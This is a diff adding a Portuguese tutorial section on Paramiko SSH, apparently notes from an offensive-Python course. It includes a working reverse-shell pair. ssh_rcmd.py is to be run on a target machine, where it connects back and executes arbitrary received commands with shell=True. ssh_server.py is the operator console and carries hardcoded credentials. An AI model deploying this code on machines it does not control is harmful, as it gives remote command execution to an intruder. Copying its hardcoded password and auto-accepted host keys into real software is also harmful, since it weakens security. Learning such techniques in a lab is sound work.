@@ -601,3 +601,198 @@ if __name__ == '__main__':
 
 Para testar, podemos usar um `curl -x 127.0.0.1:9000 www.google.com` com um `python3 proxy.py 127.0.0.1 9000 www.google.com 80 False`
 
+### SSH com Paramiko
+
+O SSH (Secure Shell Host) é uma forma de tomar controle do terminal de um host remoto. Nos sistemas Windows ele não vem naturalmente instalado, logo é vista uma necessidade de sabermos criar nosso próprio SSH. O Paramiko é uma lib que oferece um acesso simples ao protocolo SSH2. Instalaremos ele através de:
+
+`pip install paramiko`
+
+E iniciaremos o código com a criação da função `shell_command()` e da `main()`:
+
+
+```py
+# Import do paramiko
+import paramiko
+
+def ssh_command(ip, port, user, password, cmd):
+    # Instanciação do client
+    client = paramiko.SSHClient()
+    # Como o ambiente é controlado, aceitamos a chave SSH do servidor SSH que iremos nos conectar
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=password)
+
+    # Executa o comando e retorna stdin, stdout e stderr. Como sabemos o que passaremos no comando, stdin é inútil 
+    _, stdout, stderr = client.exec_command(cmd)
+    output = stdout.readlines() + stderr.readlines()
+
+    if output:
+        print("--- Saída ---")
+        for line in output:
+            # Output: `strip()` serve para remover espaços em excesso
+            print(line.strip())
+
+if __name__ == '__main__':
+    # getpass é uma lib para receber o usuario e senha atual, no python executado
+    import getpass
+    # O usuário pode ser o mesmo no ambiente, caso seja usa-se o getuser, que pede ao usuário o user desejado. Os dois métodos fazem a mesma coisa
+    # user = getpass.getuser()
+    user = input("Username: ")
+    # Pede o usuário a senha desejada de forma invisível no terminal
+    password = getpass.getpass()
+
+    ip = input('Insira o IP do servidor: ') or '127.0.0.1'
+    port = input('Insira a porta ou <CR>: ') or 9000
+    cmd = input('Insira o comando ou <CR>: ') or 'id'
+    ssh_command(ip, port, user, password, cmd)
+```
+
+Após testarmos (verifique se o computador está rodando o ssh via `sudo systemctl status ssh` e ative-o via `sudo systemctl start ssh` e start on boot por `sudo systemctl enable ssh`) verificou-se que está tudo certo.
+
+Agora, modificaremos o script para executar comandos num sistema Windows, adaptando o código para casos onde o cliente SSH não existe no OS alvo. Em `ssh_rcmd.py`:
+
+```py
+import paramiko
+import shlex
+import subprocess
+
+
+def ssh_command(ip, port, user, password, command):
+    # Conexão análoga à anterior
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=password)
+
+    # Agora, será aberta uma sessão SSH na camada de transporte, como uma janela para receber SSH
+    ssh_session = client.get_transport().open_session()
+    
+    if ssh_session.active:
+        # Assim que a janela é aberta, é enviado o command (inicialmente 'ClinetConnected')
+        ssh_session.send(command)
+        # Recebe o feedback
+        print(ssh_session.recv(1024).decode())
+
+        while True:
+            # Recebe o novo comando, de fato
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                # Executa o comando e espera o output, envia qualquer string para o outro usuário
+                cmd_output = subprocess.check_output(cmd, shell=True)
+                ssh_session.send(cmd_output or 'okay')
+            except Exception as e:
+                ssh_session.send(str(e))
+            
+        client.close()
+    return
+
+if __name__ == '__main__':
+    import getpass
+    user = input("Username: ")
+    # user = getpass.getuser()
+    password = getpass.getpass()
+
+    ip = input('Insira o IP do servidor: ')
+    port = input('Insira a porta ou <CR>: ')
+    
+    ssh_command(ip, port, user, password, 'ClientConnected')
+```
+
+O código acima é uma sessão SSH, ou seja, uma conexão entre o servidor SSH (que faremos em seguida) e a máquina atual. Ela deve ser executada na máquina do usuário com o servidor executando na máquina remota. Para o servidor SSH (`ssh_server.py`):
+
+```py
+import paramiko
+import os
+import socket
+import sys
+import threading
+
+# Acha o caminho que está sendo executado o arquivo
+CWD = os.path.dirname(os.path.realpath(__file__))
+# Acha o arquivo que tem uma chave RSA
+HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'chave.key'))
+
+class Server (paramiko.ServerInterface):
+    # Thread para execução
+    def __init__ (self):
+        self.event = threading.Event()
+
+    # Procura as sessions a serem conectadas
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+    
+    # Valida o usuário e a senha usadas
+    def check_auth_password (self, username, password):
+        if (username == 'caio') and (password == 'caio'):
+            return paramiko.AUTH_SUCCESSFUL
+            
+if __name__ == '__main__':
+    # Deve ser o IP local
+    server = '192.168.100.3'
+    # Porta arbitrária
+    ssh_port = 2222
+    
+    try:
+        # Início do socket, como no TCP e associação a um socket de SSH
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((server, ssh_port))
+        
+        sock.listen(100)
+        print("[+] Ouvindo conexões...")
+        client, addr = sock.accept()
+    except Exception as e:
+        print("[-] Falha na escuta:" + str(e))
+        sys.exit(1)
+    else:
+        print('[+] Conexão estabelecida!', client, addr)
+        
+    # Cria uma sessão no paramiko usando o cliente de onde o bind foi feito
+    session = paramiko.Transport(client)
+    # Adiciona a chave para a conexão
+    session.add_server_key(HOSTKEY)
+    server = Server()
+    session.start_server(server=server)
+    
+    chan = session.accept(20)
+    if chan is None:
+        print('*** Sem canal.')
+        sys.exit(1)
+        
+    print("[+] Autenticado!")
+    print(chan.recv(1024))
+    chan.send('Bem vindo ao SSH')
+    try:
+        # Loop de comandos, podem ser executados arbitrariamente
+        while True:
+            command = input('Insira o comando: ')
+            if command != 'exit':
+                chan.send(command)
+                r = chan.recv(8192)
+                print(r.decode())
+            else:
+                chan.send('exit')
+                print('exiting')
+                session.close()
+                break
+    except KeyboardInterrupt:
+        session.close()
+```
+
+Algumas observações:
+    - Para criar uma chave RSA, como no caso acima, pode-se usar `ssh-keygen -t rsa -b 2048 -f chave.key` e não colocar nenhuma "palavra-passe". Para enviá-la via server pode-se usar o upload do nosso `netcat.py` ou pegar uma da internet. Basta apenas que ela seja válida.
+    - O usuário e a senha podem não ser os logados
+    - O Host deve ser mudado dependendo do IP da máquina
+    - O uso de um `paramiko.util.log_to_file('paramiko.log')` pode ser útil para debug
+
+Agora, finalmente, criaremos uma nova sesssão e um novo server:
+    - O server deve ser executado no host atual
+    - A sessão deve ser executada na máquina-alvo
+
+### Explorando o código
+
+Tudo foi testado com os códigos feitos!
